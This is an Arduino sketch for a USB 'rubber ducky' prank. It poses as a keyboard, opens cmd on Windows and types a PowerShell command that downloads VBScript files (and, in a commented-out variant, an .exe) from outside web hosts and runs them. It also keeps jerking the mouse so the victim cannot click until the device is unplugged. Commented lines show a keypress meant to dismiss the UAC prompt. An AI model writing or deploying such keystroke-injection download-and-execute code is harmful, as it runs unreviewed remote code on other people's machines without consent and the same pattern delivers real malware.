/*
 *  Author: Sam van der Kris
 *  GitLab: https://gitlab.com/WarKitteh/arduino-hid-rickroll
 *  
 *  Modified by Michael K-F
 *  GitHub: https://github.com/MichaelK-F
 */

#include "Keyboard.h"
#include "Mouse.h"

void typeKey(int key) {
  Keyboard.begin();
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void runPayload() {
  Keyboard.begin();
  Mouse.begin();
  // Give Windows some time to recognize the Arduino as a human interface device
  delay(1000);

  // Open CMD
  //typeKey(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_GUI);
  delay(5);
  Keyboard.press('R');
  delay(10);
  Keyboard.releaseAll();
  delay(200);
  delay(400);
  Keyboard.print("cmd");
  delay(500);
  //Keyboard.press(KEY_LEFT_CTRL);
  //Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();

  delay(500);

  // Bypass UAC prompt
  //Keyboard.press(KEY_LEFT_ALT);
  //Keyboard.press('y');
  //delay(500);
  //Keyboard.releaseAll();

  //delay(200);

  // Download and run rickroll.vbs and volup.vbs and exit when done
  //audio only (harder to exit)
  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://michaelk-f.github.io/rubber_ducky/rickroll.vbs','%temp%\\rickroll.vbs'); && start %temp%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/volup.vbs','%temp%\\volup.vbs'); && start %temp%\\volup.vbs && exit");
  //video - easier to exit
  //Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://michaelk-f.github.io/rubber_ducky/rickroll.exe', '%temp%\\rickroll.exe'); && start %temp%\\rickroll.exe && powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/volup.vbs','%temp%\\volup.vbs'); && start %temp%\\volup.vbs && exit");
  delay(100);
  typeKey(KEY_RETURN);

  Keyboard.end();
}

void setup() {
  runPayload();
}

void loop() {
  //Moves mouse around to annoy people and to prevent them from clicking on anything until unpluged
  Mouse.begin();
  Mouse.move(0, 100);
  Mouse.move(0, -100);
  Mouse.move(100, 0);
  Mouse.move(-100,0);
}
